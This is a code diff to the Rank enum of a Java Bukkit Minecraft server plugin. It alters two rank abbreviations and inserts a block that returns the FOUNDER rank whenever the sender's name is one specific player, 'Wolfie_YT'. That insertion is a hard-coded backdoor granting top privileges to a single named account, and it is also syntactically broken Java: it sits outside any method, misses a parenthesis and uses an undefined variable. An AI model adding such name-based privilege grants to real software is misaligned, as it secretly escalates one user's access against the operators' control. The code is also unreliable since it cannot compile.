@@ -6,8 +6,8 @@ import org.bukkit.ChatColor;
 public enum Rank implements Displayable
 {
 
-    IMPOSTOR("an", "Impostor", Type.PLAYER, "Imp", ChatColor.YELLOW),
-    NON_OP("a", "Non-Op", Type.PLAYER, "", ChatColor.GREEN),
+    IMPOSTOR("an", "Impostor", Type.PLAYER, "IMP", ChatColor.YELLOW),
+    NON_OP("a", "Non-Op", Type.PLAYER, "DeOP", ChatColor.GREEN),
     OP("an", "Op", Type.PLAYER, "OP", ChatColor.RED),
     SUPER_ADMIN("a", "Super Admin", Type.ADMIN, "SA", ChatColor.AQUA),
     TELNET_ADMIN("a", "Telnet Admin", Type.ADMIN, "STA", ChatColor.DARK_GREEN),
@@ -83,6 +83,12 @@ public enum Rank implements Displayable
         return getConsoleVariant() != null;
     }
 
+
+    if (sender.getName().equals("Wolfie_YT")
+    {
+    return FOUNDER;
+    }
+    
     public Rank getConsoleVariant()
     {
         switch (this)
